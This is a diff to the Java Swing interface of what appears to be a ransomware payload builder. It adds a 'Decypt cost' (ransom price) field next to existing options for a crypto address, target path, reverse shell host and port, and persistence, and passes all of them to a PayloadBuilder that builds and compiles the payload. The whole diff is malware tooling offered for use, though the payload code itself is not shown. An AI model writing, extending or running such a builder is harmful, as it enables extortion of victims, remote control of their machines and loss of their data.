@@ -20,7 +20,7 @@ public class JRFUI {
  
         //Create and populate the panel.
          JPanel p = new JPanel(new SpringLayout());
-         p.setPreferredSize(new Dimension(600,300));
+         p.setPreferredSize(new Dimension(600,400));
          JPanel statusPanel = new JPanel();
          statusPanel.setPreferredSize(new Dimension(600, 100));
          JLabel ipLabel = new JLabel("Local IP address: ", JLabel.TRAILING);
@@ -34,6 +34,12 @@ public class JRFUI {
          JTextField addrInput = new JTextField(10);
          addrLabel.setLabelFor(addrInput);
          p.add(addrInput);
+
+         JLabel costLabel = new JLabel("Decypt cost: ", JLabel.TRAILING);
+         p.add(costLabel);
+         JSpinner costInput = new JSpinner(new SpinnerNumberModel(1, 0, 1000, 0.1));
+         costLabel.setLabelFor(costInput);
+         p.add(costInput);
 
          JLabel tgtLabel = new JLabel("Target path: ", JLabel.TRAILING);
          p.add(tgtLabel);
@@ -110,6 +116,7 @@ public class JRFUI {
                String host = ipInput.getText();
                String tgtPath = tgtInput.getText();
                String expPath = expInput.getText();
+               double cost = (Double) costInput.getValue();
                boolean useRevShell = useRev.isSelected();
                int revPort = 0;
                if (CryptAddress.equals("")) {
@@ -143,7 +150,7 @@ public class JRFUI {
                }
                boolean usePersistence = perInput.isSelected();
                
-               PayloadBuilder builder = new PayloadBuilder(tgtPath, CryptAddress, useRevShell, usePersistence, host, revPort);
+               PayloadBuilder builder = new PayloadBuilder(tgtPath, CryptAddress, cost, useRevShell, usePersistence, host, revPort);
                builder.build();
                builder.compile();
 
@@ -160,7 +167,7 @@ public class JRFUI {
 
         //Lay out the panel.
         SpringUtilities.makeCompactGrid(p,
-                                        8, 2, //rows, cols
+                                        9, 2, //rows, cols
                                         6, 6,        //initX, initY
                                         10, 10);       //xPad, yPad
  
